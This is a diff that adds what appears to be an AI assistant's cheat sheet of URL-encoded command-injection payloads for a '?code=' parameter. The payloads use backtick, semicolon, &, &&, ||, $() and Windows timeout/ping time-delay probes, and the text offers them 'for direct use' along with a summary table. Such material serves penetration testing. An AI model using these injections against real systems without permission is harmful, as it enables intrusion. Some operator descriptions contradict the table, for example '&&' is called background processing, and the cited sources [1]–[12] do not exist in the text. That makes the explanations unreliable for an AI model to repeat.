@@ -1,0 +1,56 @@
+When testing an application parameter like ?code= for potential command injection vulnerabilities, security professionals use a variety of non-destructive operators. This is because different operating systems (Linux vs. Windows) and different backend command structures require different shell syntax to execute a nested command. [1] 
+Here is a comprehensive list of non-destructive payloads categorized by the operator style, formatted for direct use after the equals sign.
+## 1. Backtick Operators (Inline Execution)
+These are used when the input is placed inside an existing command string. The shell executes the command inside the backticks first. [2, 3] 
+
+* Linux / Windows: %60sleep+5%60
+* With a placeholder value: test%60sleep+5%60
+
+## 2. Semicolon Operators (Command Separation)
+The semicolon terminates the intended command and instructs the shell to run the next command sequentially. (Primarily Linux). [4, 5] 
+
+* Standard sequential execution: test%3Bsleep+5
+* With a trailing comment to ignore the rest of the original script: test%3Bsleep+5%3B%23
+
+## 3. Logical Operators (AND / OR)
+These determine whether the second command runs based on the success or failure of the first command. [6, 7] 
+
+* Sequential execution regardless of outcome (Ampersand): test%26sleep+5
+* Background processing (Double Ampersand / Linux): test%26%26sleep+5
+* Execution if the first part fails (Double Pipe): test%7C%7Csleep+5 [8] 
+
+## 4. Command Substitution (POSIX Syntax)
+Modern shells often use $() instead of backticks for nesting commands. (Primarily Linux). [9] 
+
+* Standard substitution: test%24%28sleep+5%29
+
+## 5. Windows PowerShell / CMD Specifics
+If the backend server is running Windows instead of Linux, the sleep command does not exist. Instead, timeout or ping is used to create a non-destructive time delay. [10, 11, 12] 
+
+* Using Timeout (Windows): test%26timeout+/t+5
+* Using Ping loopback (Windows): test%26ping+-n+5+127.0.0.1
+
+------------------------------
+## Payload Summary Reference Table
+
+| Operator Type | URL-Encoded Payload | Intended Shell Behavior |
+|---|---|---|
+| Backticks | test%60sleep+5%60 | Executes sleep 5 inline |
+| Semicolon | test%3Bsleep+5 | Terminates first string, runs sleep 5 |
+| Semicolon + Comment | test%3Bsleep+5%3B%23 | Runs sleep 5 and comments out trailing code |
+| Background Ampersand | test%26sleep+5 | Spawns sleep 5 as a parallel process |
+| Logical AND | test%26%26sleep+5 | Runs sleep 5 if test succeeds |
+| Logical OR | test%7C%7Csleep+5 | Runs sleep 5 if test fails |
+| POSIX Substitution | test%24%28sleep+5%29 | Evaluates $(sleep 5) inline |
+| Windows Timeout | test%26timeout+/t+5 | Pauses Windows cmd for 5 seconds |
+| Windows Ping | test%26ping+-n+5+127.0.0.1 | Sends 5 pings to simulate a 4-second delay |
+
+------------------------------
+If you want to observe how these interact with your code, tell me:
+
+* Are you checking a Linux-based or Windows-based environment?
+* What behavior (a delay, a 500 error, or no change) did you see when trying the initial backtick?
+
+I can help you interpret the server's response to determine if it is vulnerable.
+
+
